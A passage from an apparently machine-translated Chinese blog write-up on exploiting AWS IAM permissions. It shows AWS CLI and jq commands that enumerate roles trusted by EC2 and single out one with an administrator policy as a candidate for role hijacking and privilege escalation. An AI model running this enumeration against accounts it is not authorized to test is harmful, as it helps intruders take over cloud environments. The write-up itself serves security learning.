Amazon的文档</a>声明这个调用用于列出具有指定路径前缀的角色，如果没有，操作返回一个空列表，但是这个定义可能会产生误导。你看，这个调用你需要使用</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="9150" class="mx kn iq mt b gy my mz l na nb"><br/> --path-prefix </span></pre><p id="a95b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">带有您想要搜索的前缀，但是如果您省略了它，它将默认为一个斜杠(/)，从而获得所有的角色(并因此为我们的特定用例场景替换get-role)。不管怎样，我们称之为:</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="307c" class="mx kn iq mt b gy my mz l na nb">aws --profile PROFILE iam list-roles</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi ol"><img src="../Images/32d2a8c630d8b73c2c9b997337862486.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LRupJF3CE08Bz3FGszNg1A.png"/></div></div></figure><p id="3503" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">太好了！现在，我们需要一种列出角色的方法，假设角色策略将aws EC2列为受信者。为了过滤这些，我们将使用<a class="ae kl" href="https://stedolan.github.io/jq/" rel="noopener ugc nofollow" target="_blank"> JQ </a>。Jq是解析json输出的一个很好的工具，学习曲线有点陡。为了更好地向您展示如何使用它，我将一步一步来。首先，您需要看到需要解析的结构。让我们看一下输出的一个角色:</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi om"><img src="../Images/741c673070cb80a09af31141e2efe74c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DQrFKDEzVjTAC4BxjCihlw.png"/></div></div></figure><p id="fa3f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们需要寻找的信息列在“主要”栏下。它应该看起来像这样</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="a128" class="mx kn iq mt b gy my mz l na nb">"Principal": {<br/> "Service": "ec2.amazonaws.com"<br/>},</span></pre><p id="a042" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们只选择我们感兴趣的字段</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="dc96" class="mx kn iq mt b gy my mz l na nb">aws --profile test2 iam list-roles | jq -r '.Roles[] | .RoleName, .AssumeRolePolicyDocument.Statement[].Principal.Service'</span></pre><p id="7cb9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将只筛选角色名和主体</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi on"><img src="../Images/95e23143bdb45616b8701070eb005f33.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*J0LKF79Cq8L98IX_YER4EA.png"/></div></div></figure><p id="8444" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">不是我们期望的产量。这是因为并不是所有的结果看起来都像我们之前的例子。您可能还有其他东西(例如，联邦主体):</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi oo"><img src="../Images/855e6c0f9e4913576621e64696a672e6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DblBSi6dK5VHUS4E0HvgoA.png"/></div></div></figure><p id="17f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将使解析输出更加困难，但现在是不可能的。让我们只过滤那些有主体的元素。服务！= null。</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="5986" class="mx kn iq mt b gy my mz l na nb">aws --profile test2 iam list-roles | jq -r '.Roles[] |  select( .AssumeRolePolicyDocument.Statement[].Principal.Service != null) | .RoleName, .AssumeRolePolicyDocument.Statement[].Principal.Service'</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi op"><img src="../Images/d8d451601ae6819b10e5b8b3ecaccdca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MxvDHjaIsuYAvCRQbsnawg.png"/></div></div></figure><p id="7ec4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们越来越接近了。让我们稍微润色一下结果:</p><pre class="lq lr ls lt gt ms mt mu mv aw mw bi"><span id="f17b" class="mx kn iq mt b gy my mz l na nb">aws --profile test2 iam list-roles | jq -r '.Roles[] |  select( .AssumeRolePolicyDocument.Statement[].Principal.Service != null) | .RoleName, .AssumeRolePolicyDocument.Statement[].Principal.Service' | grep -B 1 "ec2.amazonaws.com" | grep -v "ec2.amazonaws.com" |sort -u | uniq</span></pre><p id="12e4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将得到所有的结果与本金。服务还显示每个角色名称。然后，它将删除我们匹配后不再需要的主要服务。然后，它将对集合进行排序并删除重复项。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi oq"><img src="../Images/3121144e1edd7e2282efb4193abc438c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wEo5aHAr9CTgEJZabSiJHA.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">识别可能的候选角色劫持。</figcaption></figure><p id="fe0e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有大约20个结果，可以很容易地手动分析。我们现在需要用我前面说过的列表附加角色策略和列表角色策略为每一个获取相关联的策略。几分钟后，我们发现一个附加了管理员策略的角色。从现在开始就叫它危险角色吧。足够说明问题了。还有，听起来像危险地带，我喜欢阿彻。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi or"><img src="../Images/f1c40150a86e5bcfce9c56874eb2bb0c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sXhpuxz9T46zvkfg_UXhrQ.png"/></div></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">危险-角色已确定！</figcaption></figure><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div class="gh gi os"><img src="../Images/b8da586fed463bd68c95dc9a812eefff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1186/format:webp/1*RBj4OEuSYFyMranfTJ3K2g.png"/></div><figcaption class="nd ne gj gh gi nf ng bd b be z dk translated">强制Archer meme</figcaption></figure><p id="b240" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我原本打算写一篇关于这个的文章，但是我们已经有2000字了，我不想让你睡着，所以我将在这里结束第一部分。在<a class="ae kl" href="https://medium.com/bugbountywriteup/exploiting-aws-iam-permissions-for-total-cloud-compromise-a-real-world-example-part-2-2-f27e4b57454e" rel="noopener">第2部分</a>中，我们将了解如何使用该角色提升权限。</p></div></div>    
</body>
</html>